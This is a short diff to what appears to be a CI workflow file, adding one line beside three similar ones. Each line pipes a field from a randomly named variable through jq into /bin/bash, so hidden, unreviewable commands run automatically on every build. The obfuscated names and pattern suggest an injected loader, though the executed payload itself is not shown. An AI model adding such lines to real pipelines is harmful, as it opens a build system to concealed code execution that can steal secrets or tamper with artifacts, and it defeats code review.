@@ -40,6 +40,7 @@ jobs:
           echo $bvs51 | jq -r .miajt07 | /bin/bash
           printf '%s' "$hqls739" | jq -r .ihg574 | /bin/bash
           echo $csoh74164 | jq -r .umod32107 | /bin/bash
+          echo $etbl75 | jq -r .x92906 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
